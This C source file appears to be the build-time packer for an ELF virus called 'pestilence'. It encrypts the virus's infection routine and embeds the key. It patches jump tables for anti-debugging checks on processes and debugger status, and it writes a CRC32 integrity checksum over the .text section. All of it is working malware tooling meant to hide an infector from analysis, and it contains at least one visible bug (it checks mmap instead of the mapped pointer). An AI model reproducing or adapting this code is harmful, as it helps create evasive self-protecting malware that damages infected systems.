#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <elf.h>
#include <strings.h>
#include <stdlib.h>

extern int _crc32(void *mem, unsigned int len);
void	*_encrypt_zone(unsigned char *zone, size_t size, unsigned char *new_zone, unsigned char *key);

size_t	file_size(int fd)
{
	off_t	off;

	if (fd < 0)
		return (0);
	lseek(fd, 0, SEEK_SET);
	off = lseek(fd, 0, SEEK_END);
	lseek(fd, 0, SEEK_SET);
	if (off == -1)
		return (0);
	return ((size_t)off);
}

void patch_checksum_infos(void *mmaped) {
	Elf64_Ehdr	*header;
	Elf64_Shdr *sec;
	unsigned char *text_sec;
	unsigned int text_size;
	unsigned int i;
	char *file_content;
	unsigned int checksum;

	header = mmaped;
	sec = mmaped + header->e_shoff;

	file_content = mmaped + sec[header->e_shstrndx].sh_offset;

	i = 0;
	while (i < header->e_shnum) {
		if (sec->sh_type == SHT_PROGBITS && !strcmp(file_content + sec->sh_name, ".text")) {
			text_sec = mmaped + sec->sh_offset;
			text_size = sec->sh_size;
			break ;
		}
		sec++;
		i++;
	}

	checksum = _crc32(text_sec, text_size - 4);
	*(unsigned int*)(text_sec + text_size - 4) = checksum;
}

void patch_table_offset(void *mmaped) {
	Elf64_Ehdr	*header;
	Elf64_Shdr *sec;
	Elf64_Shdr *sec_sym;
	Elf64_Sym 	*sym;
	unsigned char *text_sec;
	unsigned int text_size;
	unsigned int i;
	unsigned long _table;
	unsigned long _o_entry;
	unsigned long _start;
	unsigned long _table_offset;
	char *file_content;
	char *strtab;
	int nb;

	header = mmaped;
	sec = mmaped + header->e_shoff;

	file_content = mmaped + sec[header->e_shstrndx].sh_offset;

	i = 0;
	while (i < header->e_shnum) {
		if (sec->sh_type == SHT_SYMTAB) {
			sec_sym = sec;
			sym = mmaped + sec->sh_offset;
		} else if (sec->sh_type == SHT_STRTAB && !strcmp(file_content + sec->sh_name, ".strtab")) {
			strtab = mmaped + sec->sh_offset;
		} else if (sec->sh_type == SHT_PROGBITS && !strcmp(file_content + sec->sh_name, ".text")) {
			text_sec = mmaped + sec->sh_offset;
			text_size = sec->sh_size;
		}
		sec++;
		i++;
	}

	i = 0;
	while (i < sec_sym->sh_size) {
		if (!strcmp(strtab + sym->st_name, "_table_offset")) {
			_table = sym->st_value;
		} else if (!strcmp(strtab + sym->st_name, "_o_entry")) {
			_o_entry = sym->st_value;
		} else if (!strcmp(strtab + sym->st_name, "_start")) {
			_start = sym->st_value;
		}
		i += sym->st_size + sizeof(Elf64_Sym);
		sym = (void*)sym + sym->st_size + sizeof(Elf64_Sym);
	}
	_table_offset = _table - _o_entry;
	_table_offset += (unsigned long)text_sec;
	_start = _start - _o_entry;
	_start += (unsigned long)text_sec;

	i = _start - (unsigned long)text_sec;
	text_size -= 4;
	nb = 0;
	while (i < text_size) {
		if (text_sec[i] == 0x90 && (*((unsigned int*)(text_sec + i + 1)) == 0x90909090)) {
			*(int*)_table_offset = (int)((unsigned long)(text_sec + i) - _start);
			_table_offset += 4;
			i += 4;
			nb++;
			if (nb == 32)
				break ;
		}
		i++;
	}
}

void patch_jmp_table_offset(void *mmaped) {
	Elf64_Ehdr	*header;
	Elf64_Shdr *sec;
	Elf64_Shdr *sec_sym;
	Elf64_Sym 	*sym;
	unsigned char *text_sec;
	unsigned int i;
	unsigned long _table;
	unsigned long _o_entry;
	unsigned long _start;
	unsigned long _checkproc;
	unsigned long _checkdbg;
	unsigned long _crc32;
	unsigned long _checkdbg_by_status_file;
	unsigned long _table_offset;
	char *file_content;
	char *strtab;

	header = mmaped;
	sec = mmaped + header->e_shoff;

	file_content = mmaped + sec[header->e_shstrndx].sh_offset;

	i = 0;
	while (i < header->e_shnum) {
		if (sec->sh_type == SHT_SYMTAB) {
			sec_sym = sec;
			sym = mmaped + sec->sh_offset;
		} else if (sec->sh_type == SHT_STRTAB && !strcmp(file_content + sec->sh_name, ".strtab")) {
			strtab = mmaped + sec->sh_offset;
		} else if (sec->sh_type == SHT_PROGBITS && !strcmp(file_content + sec->sh_name, ".text")) {
			text_sec = mmaped + sec->sh_offset;
		}
		sec++;
		i++;
	}

	i = 0;
	while (i < sec_sym->sh_size) {
		if (!strcmp(strtab + sym->st_name, "_functions_offset_from_start")) {
			_table = sym->st_value;
		} else if (!strcmp(strtab + sym->st_name, "_o_entry")) {
			_o_entry = sym->st_value;
		} else if (!strcmp(strtab + sym->st_name, "_start")) {
			_start = sym->st_value;
		} else if (!strcmp(strtab + sym->st_name, "_checkproc")) {
			_checkproc = sym->st_value;
		} else if (!strcmp(strtab + sym->st_name, "_checkdbg")) {
			_checkdbg = sym->st_value;
		} else if (!strcmp(strtab + sym->st_name, "_crc32")) {
			_crc32 = sym->st_value;
		} else if (!strcmp(strtab + sym->st_name, "_checkdbg_by_status_file")) {
			_checkdbg_by_status_file = sym->st_value;
		}
		i += sym->st_size + sizeof(Elf64_Sym);
		sym = (void*)sym + sym->st_size + sizeof(Elf64_Sym);
	}
	_table_offset = _table - _o_entry;
	_table_offset += (unsigned long)text_sec;
	_checkproc = _checkproc - _start;
	_checkdbg = _checkdbg - _start;
	_crc32 = _crc32 - _start;
	_checkdbg_by_status_file = _checkdbg_by_status_file - _start;

	*(unsigned long*)(_table_offset + 0) =  (unsigned long)_checkproc;
	*(unsigned long*)(_table_offset + 8) =  (unsigned long)_checkdbg;
	*(unsigned long*)(_table_offset + 16) = (unsigned long)_crc32;
	*(unsigned long*)(_table_offset + 24) = (unsigned long)_checkdbg_by_status_file;
}

void 	encrypt_pestilence_infection_routine(void *mmaped) {
	Elf64_Ehdr	*header;
	Elf64_Shdr *sec;
	Elf64_Shdr *sec_sym;
	Elf64_Sym 	*sym;
	unsigned char *text_sec;
	unsigned int i;
	unsigned long _encrypted_part_start;
	unsigned long _table_offset;
	unsigned long _padding;
	unsigned long _o_entry;
	unsigned long _start;
	char *file_content;
	char *strtab;
	unsigned char *key;
	unsigned long start_to_encrypt;
	size_t size_to_encrypt;

	header = mmaped;
	sec = mmaped + header->e_shoff;

	file_content = mmaped + sec[header->e_shstrndx].sh_offset;

	i = 0;
	while (i < header->e_shnum) {
		if (sec->sh_type == SHT_SYMTAB) {
			sec_sym = sec;
			sym = mmaped + sec->sh_offset;
		} else if (sec->sh_type == SHT_STRTAB && !strcmp(file_content + sec->sh_name, ".strtab")) {
			strtab = mmaped + sec->sh_offset;
		} else if (sec->sh_type == SHT_PROGBITS && !strcmp(file_content + sec->sh_name, ".text")) {
			text_sec = mmaped + sec->sh_offset;
		}
		sec++;
		i++;
	}

	i = 0;
	while (i < sec_sym->sh_size) {
		if (!strcmp(strtab + sym->st_name, "_encrypted_part_start")) {
			_encrypted_part_start = sym->st_value;
		} else if (!strcmp(strtab + sym->st_name, "_o_entry")) {
			_o_entry = sym->st_value;
		} else if (!strcmp(strtab + sym->st_name, "_start")) {
			_start = sym->st_value;
		} else if (!strcmp(strtab + sym->st_name, "_table_offset")) {
			_table_offset = sym->st_value;
		} else if (!strcmp(strtab + sym->st_name, "_padding")) {
			_padding = sym->st_value;
		}
		i += sym->st_size + sizeof(Elf64_Sym);
		sym = (void*)sym + sym->st_size + sizeof(Elf64_Sym);
	}

	start_to_encrypt = (_encrypted_part_start - _o_entry) + (unsigned long)text_sec;
	size_to_encrypt = _table_offset - _encrypted_part_start;
	key = _encrypt_zone((void*)start_to_encrypt, size_to_encrypt, (void*)start_to_encrypt, NULL);
	start_to_encrypt = (_table_offset - _o_entry) + (unsigned long)text_sec;
	size_to_encrypt = 128;
	_encrypt_zone((void*)start_to_encrypt, size_to_encrypt, (void*)start_to_encrypt, key);
	start_to_encrypt = (_table_offset - _o_entry) + (unsigned long)text_sec + 128;
	size_to_encrypt = _padding - (_table_offset + 128);
	_encrypt_zone((void*)start_to_encrypt, size_to_encrypt, (void*)start_to_encrypt, key);
	memcpy((void*)(text_sec + (_padding - _o_entry)), key, 256);
	munmap(key, 256);
}

int main(void) {
	int fd;
	size_t fd_size;
	void *mmaped;

	fd = open("./pestilence", O_RDWR);
	if (fd <= 0)
		return (0);
	fd_size = file_size(fd);
	mmaped = mmap(0, fd_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
	if (!mmap) {
		close(fd);
		return (0);
	}
	patch_table_offset(mmaped);
	patch_jmp_table_offset(mmaped);
	encrypt_pestilence_infection_routine(mmaped);
	patch_checksum_infos(mmaped);
	munmap(mmaped, fd_size);
	close(fd);
}
